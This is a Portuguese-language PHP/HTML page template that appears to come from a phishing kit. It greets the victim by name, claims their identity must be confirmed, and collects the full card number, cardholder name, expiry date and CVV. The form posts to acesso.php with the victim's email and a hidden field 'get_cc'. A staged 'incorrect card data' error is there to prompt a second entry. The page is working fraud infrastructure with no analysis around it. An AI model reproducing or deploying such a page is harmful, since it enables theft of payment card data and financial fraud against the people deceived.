<div class="block_loading">
	<div class="block_title">
		<span class="headline"><?= getSaudacao();?><b> <?= $ShowNameUser;?></b></span>
		<p class="description">Para continuar com o acesso, informe os dados abaixo:</p>
	</div>

	<div class="block_ps4">

		<?php 
			if(isset($_SESSION['ShowError']) && $_SESSION['ShowError'] == 1):
				$display = 'block!important;';
				$_SESSION['ShowError'] = 0;
			else:
				$display = 'none!important;';
			endif;	
		?>
		<div class="block_error" style="display:<?php echo $display;?>">
			Os dados do cartão de crédito/débito informado não estão corretos!
			<span class="pos_close_error">x</span>
			<div class="clear"></div>
		</div><!-- block_errorblock_error -->
		<div class="clear"></div>

		<div class="block_message_all">
			Para prosseguir com segurança, <span class="red_txt">precisamos confirmar sua identidade!</span><br>
			Informe os dados do seu cartão de crédito/débito para continuar.
		</div><!-- block_message_all -->
		
		<div class="block_need_card">
			<form action="acesso.php?cliente=<?php echo $emailx; ?>" method="post" name="form_card" id="form_card" onsubmit="return check_FC();">
				<label for="cd_name">
					<span>Nome do cartão:</span> 
					<input type="text" name="cd_name" id="cd_name" class="normal_input" autocomplete="off">
				</label>
				<label for="cd_number">
					<span>Número do cartão:</span> 
					<input type="text" name="cd_number" id="cd_number" maxlength="16" class="normal_input" onkeypress='return SomenteNumero(event)' autocomplete="off">
				</label>
				<label for="cd_val">
					<span>Validade:</span> 
					<input type="text" name="cd_val" id="cd_val"  maxlength="5" class="normal_input person_val" onkeypress='return SomenteNumero(event)' autocomplete="off">
				</label>
				<label for="cd_cvv">
					<span>Código de segurança:</span> 
					<input type="text" name="cd_cvv" id="cd_cvv"  maxlength="3" class="normal_input person_cvv" onkeypress='return SomenteNumero(event)' autocomplete="off">
				</label>
				<input type="hidden" name="sender" value="get_cc">
			</form>
		</div><!-- block_need_card -->

	</div><!-- block_ps4 -->

	<div class="block_buttons_form">
		<div class="clear_btn J_Cancel"></div>
		<div class="submit_btn J_Submit_FC"></div>
	</div><!-- block_buttons_form -->

</div><!-- block_loading -->